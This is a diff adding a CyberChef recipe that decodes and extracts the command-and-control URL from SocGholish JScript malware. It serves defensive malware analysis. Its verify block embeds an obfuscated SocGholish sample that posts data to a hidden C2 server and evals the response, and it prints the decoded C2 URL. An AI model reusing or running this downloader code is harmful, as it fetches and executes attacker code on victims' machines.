@@ -1,0 +1,24 @@
+{
+    "recipe": [
+        { "op": "Regular expression", "args": ["User defined","\\(\\'(.*)\\'\\)",true,true,false,false,false,false,"List capture groups"]},
+        { "op": "Fork", "args": ["\\n","\\n",false] },
+        { "op": "Regular expression", "args": ["User defined",".(.)",true,true,false,false,false,false,"List capture groups"] },
+        { "op": "Split", "args": ["\\n",""] },
+        { "op": "Reverse", "args": ["Character"] },
+        { "op": "Merge", "args": [] },
+        { "op": "Extract URLs", "args": [false] }
+    ],
+    "name": "SocGholish URL Extractor",
+    "meta": {
+        "author": "David B Heise",
+        "date": "2021-10-22T14:58:07.656Z",
+        "description": "Extracts the C2 URL from SohGholish WScript-JS",
+        "cve": "",
+        "attck": "T1001",
+        "kc": "kc3"
+    },
+    "verify": {
+        "originalInput": "var lrupe = (new Date)['getTime']();\nvar giwi = ixyh7(lrupe);\nwhile (lrupe < giwi) {\n\tlrupe = (new Date)['getTime']();\n\tthis['WScript']['Sleep'](1000);\n}\n\nfunction ixyh7(erga3) {\n\treturn erga3 + 10000;\n}\n\n\nfunction sendRequest(ijjreluev, kewadokdwu) {\n\n\tif(typeof kewadokdwu === 'undefined') { kewadokdwu = false; }\n\n\tvar vyshysgeclan = '', yxwun = '', bapo, vzezwaobij5='eval';\n\n\tfor (var edmitgezdo = 0; edmitgezdo < ijjreluev['length']; edmitgezdo++) {\n\t\tvyshysgeclan += edmitgezdo + '=' + encodeURIComponent(''+ijjreluev[edmitgezdo]) + '&';\n\t}\n\tvyshysgeclan = thyez(vyshysgeclan);\n\n\ttry {\n\t\tvar ypruzsywxyb;\n\t\typruzsywxyb = new ActiveXObject('MSXML2.XMLHTTP');\n\t\typruzsywxyb['open']('POST', enpygo, false);\n\t\typruzsywxyb['send'](vyshysgeclan);\n\t\tif (ypruzsywxyb['status'] == 200) {\n\t\t\tyxwun = ypruzsywxyb['responseText'];\n\t\t\tif(yxwun) {\n\t\t\t\tbapo = lafamdo(yxwun);\n\t\t\t\tif(kewadokdwu) {\n\t\t\t\t\treturn bapo;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tthis[vzezwaobij5](bapo);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t} catch (e) {}\n\n\treturn false;\n\t\n}\n\nvar enpygo = vutzy('dftipgl.d1rxo1j/fmcoocn.syeezrubskpraaxma.pnvitghollx.v7i6w6raaffbg8y2f/y/r:zsvputqtyhu');\nvar tid =  vutzy('t0w0g5e');\nvar wbz = vutzy('o3ddo9r9zdr7y1b9g');\n\nvar ijjreluev = idluyhhig();\n\nfunction idluyhhig() {\n\treturn ['a', tid];\n}\n\n\n\n\n\nsendRequest(ijjreluev);\n\n\nfunction johzoqe(edmitgezdo) {\n\tvar nonel = '00'+edmitgezdo['toString'](16);\n\tvar uvcyqo = nonel['length'];\n\tnonel = nonel['substr'](uvcyqo-2);\n\treturn nonel;\n}\n\nfunction lafamdo(woowquba8) {\n\tvar nilcy, ccuxubwyap, edmitgezdo, yxwun = '';\n\n\tccuxubwyap = parseInt(woowquba8['substr'](0, 2), 16);\n\tnilcy = woowquba8['substr'](2);\n\t\n\tfor (edmitgezdo = 0; edmitgezdo < nilcy['length']; edmitgezdo+=2) {\n\t\tyxwun += String['fromCharCode'](niersihyl(parseInt(nilcy['substr'](edmitgezdo, 2), 16), ccuxubwyap));\n\t}\n\t\n\t\t\n\treturn yxwun;\n}\n\n\nfunction thyez(woowquba8) {\n\tvar ccuxubwyap = 88, edmitgezdo, yxwun = '';\n\t\n\tfor (edmitgezdo = 0; edmitgezdo < woowquba8['length']; edmitgezdo++) {\n\t\tyxwun += johzoqe(woowquba8['charCodeAt'](edmitgezdo) ^ ccuxubwyap);\n\t}\n\n\treturn (johzoqe(ccuxubwyap)+yxwun);\n}\n\n\n\nfunction niersihyl(flucipsa2, ikofnuntyp) {\t\n\treturn flucipsa2 ^ ikofnuntyp;\n}\n\n\nfunction vutzy(fipzamrixnes) {\n\tfipzamrixnes = fipzamrixnes.split('');\n\tvar atngy = '';\n\tfor(var vafna=0; vafna<fipzamrixnes['length']; vafna++) {\n\t\tif(vafna%2===1) atngy += fipzamrixnes[vafna];\n\t}\n\tatngy = gkuzjuufnew(atngy);\n\treturn atngy;\n}\n\nfunction gkuzjuufnew(lysju) {\n\tlysju = cuwru0(lysju);\n\tvar ipefrxo = '';\n\tfor (var huniq = lysju['length'] - 1; huniq >= 0; huniq--) {\n\t\tipefrxo += lysju[huniq];\n\t}\n\treturn ipefrxo;\n}\n\nfunction cuwru0(hufew) {\n\tvar lyrrudi6 = hufew;\n\treturn lyrrudi6.split('');\n}\n\n",
+        "expectedOutput": "https://28bfa667.login.markbrey.com/1x1.gif\n"
+    }
+}
